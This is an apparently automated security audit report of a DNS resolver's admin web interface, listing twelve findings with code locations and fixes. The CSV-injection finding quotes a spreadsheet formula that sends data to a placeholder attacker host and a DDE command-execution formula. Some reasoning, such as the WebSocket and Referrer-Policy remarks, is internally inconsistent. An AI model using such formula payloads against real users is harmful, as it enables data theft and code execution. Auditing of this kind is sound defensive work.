# Hunt: Frontend, Headers, WebSocket

## Summary
12 findings: 1 critical, 2 high, 6 medium, 3 low, 0 info

## Findings

### [CRITICAL] Setup wizard endpoint allows post-install admin takeover  (CWE-863)
**File**: web/api_setup.go:39-98 (handler) ; web/server.go:50,90-112,389-390 (state); main_runtime_helpers.go:46 (constructor)
**Skill**: sc-data-exposure
**Description**: `s.setupDone` is a plain `bool` field on `AdminServer` that is only set to `true` *inside* the `handleSetupComplete` handler itself (`api_setup.go:94`). `NewAdminServer` never inspects whether a config file already exists, so on every restart of an already-provisioned server the field is `false`. Both `/api/setup/status` and `/api/setup/complete` are wired with no auth (`server.go:389-390`), and `handleSetupComplete` only refuses when `s.setupDone` is true. An attacker who can reach the admin port (default `127.0.0.1:8080`, but operators commonly bind it externally) can therefore POST a fresh `SetupRequest` immediately after a restart: `writeConfigYAML` overwrites `labyrinth.yaml` with attacker-supplied `username`/`password_hash`, ListenAddr, etc. The in-memory bcrypt hash is *not* updated, so the running process keeps the old credentials, but on the next process restart the binary loads the rewritten YAML and the attacker owns the admin login. This is a full take-over of the resolver host (config editor allows arbitrary YAML, including blocklist URLs that fetch over HTTPS, and DNS forwarders).
**Recommendation**: In `NewAdminServer` set `setupDone = cfg.Web.Auth.Username != "" && cfg.Web.Auth.PasswordHash != ""` (or an equivalent "config already on disk" check) before returning. Keep `/api/setup/complete` reachable only when that flag is false. Consider also requiring loopback origin or a one-shot bootstrap token printed to stdout on first launch.

### [HIGH] WebSocket upgrade accepts arbitrary Origin (cross-site WebSocket hijacking)  (CWE-1385)
**File**: web/api_queries.go:43-46 ; web/timeseries_ws.go:121-124
**Skill**: sc-websocket
**Description**: Both WebSocket endpoints call `websocket.Accept(w, r, &websocket.AcceptOptions{InsecureSkipVerify: true})`. `nhooyr.io/websocket` only enforces the same-origin rule when `InsecureSkipVerify` is false (or `OriginPatterns` is set), so any cross-origin page in the browser can open a WS to `/api/queries/stream` and `/api/stats/timeseries/ws`. Auth is via the `?token=` query parameter (see `client.ts:244,258`), and the `requireAuth` middleware (`middleware.go:36-39`) accepts that token. Browsers automatically send the URL on a `new WebSocket(...)` connection, so a victim already logged into the admin UI is enough — the attacker page does not need the token, only the victim's auth cookie/localStorage; however, since the token lives in `localStorage` the WS URL has to be reconstructed by an attacker page only after first leaking the token via a separate XSS (so on its own this is an authenticated-replay primitive, not zero-click). Combined with another origin-trusting attacker page on the same host (e.g. an XSS in a sibling app or an SVG hosted via the SPA), it lets an attacker exfiltrate the live query stream — i.e. every DNS lookup performed by every client of the resolver — to an arbitrary origin.
**Recommendation**: Pass `OriginPatterns: []string{cfg.Web.AllowedOrigin}` (default to the configured `web.addr` host) and remove `InsecureSkipVerify: true`. Reject upgrades whose `Origin` does not match.

### [HIGH] No HTTP security headers on the admin UI (CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, HSTS)  (CWE-693, CWE-1021)
**File**: web/middleware.go (no header middleware) ; web/embed.go:15-51 (SPA handler) ; web/server.go:271-287 (only `Alt-Svc` is set)
**Skill**: sc-clickjacking, sc-xss, sc-header-injection
**Description**: `grep` for `w.Header().Set(` in `web/` returns only `Content-Type`, `Cache-Control`, `Retry-After`, and `Alt-Svc`. No `Content-Security-Policy`, no `X-Frame-Options`, no `X-Content-Type-Options: nosniff`, no `Referrer-Policy`, no `Permissions-Policy`, no `Strict-Transport-Security`. Concrete consequences:
* Clickjacking: `index.html` (web/ui/index.html) can be framed by any origin, and the React SPA performs sensitive admin actions (cache flush, blocklist edit, config write, password change) behind a single click — UI redress to e.g. trick an admin into clicking `Apply Update` or `Cache Flush` is trivial.
* No CSP fallback for any future XSS — and since the JWT is in `localStorage` (see L4 below), any XSS yields full account take-over.
* No HSTS even when TLS is configured (`server.go:225-238`), so first-visit downgrade is possible.
* `embed.go:20` returns `text/html` from the placeholder path with no `nosniff`, and the static file server (`http.FileServer`) does content-type sniffing for any file shipped under `ui/dist/` — a file later added with a sniffable prefix would be rendered as HTML.
**Recommendation**: Add a header middleware applied to the whole mux that sets at least:
* `Content-Security-Policy: default-src 'self'; img-src 'self' data:; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; frame-ancestors 'none'; base-uri 'none'; form-action 'self'`
* `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy: geolocation=(), microphone=(), camera=()`
* `Strict-Transport-Security: max-age=31536000; includeSubDomains` when TLS is active.

### [MEDIUM] JWT stored in `localStorage` and sent in WebSocket query string  (CWE-522, CWE-598)
**File**: web/ui/src/api/client.ts:22-43, 241-260 ; web/ui/src/App.tsx:44-52, 74-84
**Skill**: sc-secrets, sc-data-exposure
**Description**: The 24-hour JWT is persisted with `localStorage.setItem('labyrinth_token', token)` and read back on every request. `localStorage` is reachable from any same-origin script, so any future XSS or any third-party `<script>` added to the SPA bundle exfiltrates the admin token immediately. In addition, `createQueryWebSocket()` and `createTimeSeriesWebSocket()` build the WS URL as `wss://host/api/...?token=<JWT>`. The full URL — including the JWT — is recorded in:
* the Go server's request-line logs (`http.Server` logs `r.URL.RequestURI()`),
* any reverse-proxy / load-balancer access log in front of the admin server,
* the browser's DevTools network panel and shared crash dumps,
* anything that echoes `Referer` (mitigated only because no Referrer-Policy is set, see H2).
**Recommendation**: Switch to a short-lived `HttpOnly; Secure; SameSite=Strict` cookie for the dashboard. For the WebSocket auth, send the token in the `Sec-WebSocket-Protocol` subprotocol header (the `nhooyr.io/websocket` server already exposes `Subprotocols`) or require a same-origin cookie to be present.

### [MEDIUM] CSV export does not neutralise spreadsheet formula prefixes (CSV injection)  (CWE-1236)
**File**: web/ui/src/pages/QueriesPage.tsx:204-233 ; web/ui/src/pages/CachePage.tsx:223-245 ; web/ui/src/pages/BlocklistPage.tsx:163-186 ; web/ui/src/pages/ReportsPage.tsx:139-178 (also via `downloadFile` at 24-32)
**Skill**: sc-data-exposure
**Description**: All four CSV exporters take server-supplied strings and embed them directly into the cell. `QueriesPage.exportCSV` writes `q.qname` and `q.client` (the DNS query name and the source IP — both attacker-influenced because any LAN user can issue DNS queries with arbitrary qnames). `BlocklistPage.exportListsCSV` writes `list.url` and `list.error` (the latter contains upstream HTTP error strings the admin does not control). `CachePage.exportNegativeCSV` writes `entry.name` (qname). `ReportsPage.exportCSV` writes `top_clients.key`, `top_domains.key`, etc. None of them strip or quote-escape a leading `=`, `+`, `-`, `@`, `\t`, or `\r` — Excel/LibreOffice/Google Sheets will then evaluate cells like `=HYPERLINK("https://attacker/?"&A1,"Click")` or `=cmd|' /c calc'!A1` (DDE) the moment the admin opens the export. The only sanitisation done is `.replace(/,/g, ';')` (QueriesPage drops comma; the others quote-double-up double quotes), neither of which addresses formula injection.
**Recommendation**: In each exporter, prefix any cell that begins with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single quote (`'`), and always wrap such cells in `"..."`. A central helper, e.g. `csvSafe(s) => /^[=+\-@\t\r]/.test(s) ? '"\'' + s.replace(/"/g,'""') + '"' : '"' + s.replace(/"/g,'""') + '"'`, is enough.

### [MEDIUM] No security headers on DoH responses; `Cache-Control` is publicly cacheable  (CWE-525)
**File**: web/api_doh.go:66-69
**Skill**: sc-header-injection, sc-data-exposure
**Description**: `handleDoH` sets only `Content-Type: application/dns-message` and `Cache-Control: max-age=<minTTL>`. Without a `private` directive and without `Vary` on the `dns` query parameter, intermediate caches (CDNs, corporate proxies) may store DoH responses keyed by URL only — letting one client receive another's answer envelope. There is also no `X-Content-Type-Options: nosniff` (some browsers treat DNS wire format weirdly) and no `Referrer-Policy`. Combined with the absence of any DoH-specific rate limit (see L1 below), an attacker can also use the endpoint as a low-cost cache-fingerprinting oracle.
**Recommendation**: Set `Cache-Control: private, max-age=<minTTL>` and `X-Content-Type-Options: nosniff`. Add a `Vary: Accept` header. Apply the global security-header middleware here too.

### [MEDIUM] DoH endpoint has no rate limit or per-client quota  (CWE-770)
**File**: web/server.go:432-434 (route) ; web/api_doh.go:17-70 (handler)
**Skill**: sc-data-exposure
**Description**: When `dohEnabled` is true, `/dns-query` is registered without any wrapping middleware (no `requireAuth`, no rate limit, and `loginLimiter` covers only `/api/auth/login`). `handleDoH` then synchronously calls `s.dohHandler.Handle(query, clientAddr)`, which is the full recursive resolver. The 64 KiB body limit (`api_doh.go:93`) caps a single request but does nothing for request rate. An unauthenticated attacker on the network can use the public DoH endpoint as a recursive-DNS amplifier, or simply burn CPU and upstream egress until the resolver falls over.
**Recommendation**: Reuse the existing security/rate-limit token bucket (the resolver already has `cfg.Security.RateLimit`, used for plain DNS) for DoH as well. At minimum, enforce a per-IP request-per-second cap inside `handleDoH` before invoking the handler.

### [MEDIUM] Authenticated `GET /api/config/raw` returns the bcrypt password hash  (CWE-200)
**File**: web/api_config.go:317-335
**Skill**: sc-data-exposure
**Description**: `handleConfigRaw` `GET` reads the entire YAML config file and returns it verbatim, including `web.auth.password_hash`. Any holder of a valid JWT — including a session that has been hijacked via the WS-origin issue (H1) or via a stolen `localStorage` token (M1) — can fetch the bcrypt hash and crack it offline. Bcrypt slows the attack but does not eliminate it for weak/reused passwords. The same handler also exposes any future secrets stored in the YAML (TLS key paths, blocklist credentials, etc.).
**Recommendation**: Redact `password_hash` (and any other secret-shaped key) before returning the YAML. The `PUT` path already enforces "hash unchanged" via `ensurePasswordHashUnchanged`, so the editor does not need to *see* the hash to round-trip it; emit a placeholder like `password_hash: "<redacted>"` and detect the placeholder on save.

### [MEDIUM] No body-size limit on JSON request bodies (DoS)  (CWE-770)
**File**: web/auth.go:196, 269 ; web/api_setup.go:51 ; web/api_config.go:294, 338 ; web/api_blocklist.go:62, 84 ; web/api_dashboard_layout.go:117
**Skill**: sc-data-exposure
**Description**: All JSON endpoints decode straight from `r.Body`: `json.NewDecoder(r.Body).Decode(&req)`. Only `api_doh.go:93` wraps `r.Body` with `io.LimitReader(..., 65536)`. The `http.Server` configured in `server.go:173-179` sets timeouts but not `MaxHeaderBytes` for body. An unauthenticated client can stream gigabytes to `/api/auth/login` and pin a goroutine + JSON decoder until the 15 s `ReadTimeout` fires — repeated, this exhausts the file-descriptor budget. `/api/config/raw` (PUT) is auth-gated but accepts the full YAML config, again unbounded.
**Recommendation**: Wrap each body with `http.MaxBytesReader(w, r.Body, N)` (1 MiB for config raw/validate, 8 KiB for everything else). Reject oversized bodies with `413`.

### [LOW] Login endpoint hashes attacker-supplied passwords of arbitrary size  (CWE-770)
**File**: web/auth.go:175-226
**Skill**: sc-data-exposure
**Description**: `handleLogin` decodes the request body (no body limit, see M4) and calls `bcrypt.CompareHashAndPassword`. Bcrypt internally truncates input at 72 bytes, so the asymptotic CPU cost is bounded; however, `json.NewDecoder` will still allocate the full string in memory before calling bcrypt, and the login limiter (`loginLimiter.allow`) only kicks in *after* a few failures. An attacker can submit a large `"password": "<big string>"` to inflate process RSS before hitting the limiter.
**Recommendation**: Reject `len(req.Password) > 256` early (and `len(req.Username) > 256`) before invoking bcrypt. Combine with the body-size limit fix in M4.

### [LOW] DoH `client.ts` redirects to `/login` via `window.location.href` from any 401  (CWE-601)
**File**: web/ui/src/api/client.ts:77-81
**Skill**: sc-open-redirect
**Description**: On any 401 response, the SPA assigns `window.location.href = '/login'`. The destination is hard-coded so this is **not** an open redirect today, but the surrounding pattern is fragile: if a future change ever incorporates the request path or a server-supplied `redirect_to` field into this assignment, it becomes an open redirect, and the absence of CSP `form-action`/`frame-ancestors` (H2) means there's no defence-in-depth. Also, replacing the location instead of using React Router triggers a full reload that throws away any in-flight async work and may flicker through unauthenticated SPA chrome.
**Recommendation**: Replace with a navigation event handled inside the React Router context (e.g. dispatch to `useNavigate()` via an auth-context broadcaster). Whitelist the destination to a fixed string regardless of input.

### [LOW] External links in `Layout.tsx` and `AboutPage.tsx` are correctly `rel="noopener noreferrer"`, but `release_url`/`releaseUrl` flows from server JSON  (CWE-601)
**File**: web/ui/src/pages/AboutPage.tsx:286-294 ; web/ui/src/pages/DashboardPage.tsx:569-578 ; sources: web/api_update.go:26,365 (`release.HTMLURL` from GitHub API)
**Skill**: sc-open-redirect, sc-xss
**Description**: `AboutPage` renders `<a href={updateInfo.release_url} target="_blank" rel="noopener noreferrer">` — `target="_blank"` is mitigated, but the URL itself is not validated as `https?://`. The value originates from `web/api_update.go:365` (`release.HTMLURL`), which is the `html_url` field of a GitHub Releases API response, so a compromised upstream (e.g. user pinned to a malicious mirror via `update.repo` config) could inject `javascript:`-scheme URIs that React happily renders. The `DashboardPage` variant at line 571 is worse: it omits `target="_blank"` and `rel`, so a `javascript:` href would execute in the SPA's origin.
**Recommendation**: Validate `release_url` server-side and on the client (e.g. `if (!/^https?:\/\//.test(url)) url = ''`). Always render unknown external URLs through a helper that strips non-http(s) schemes.

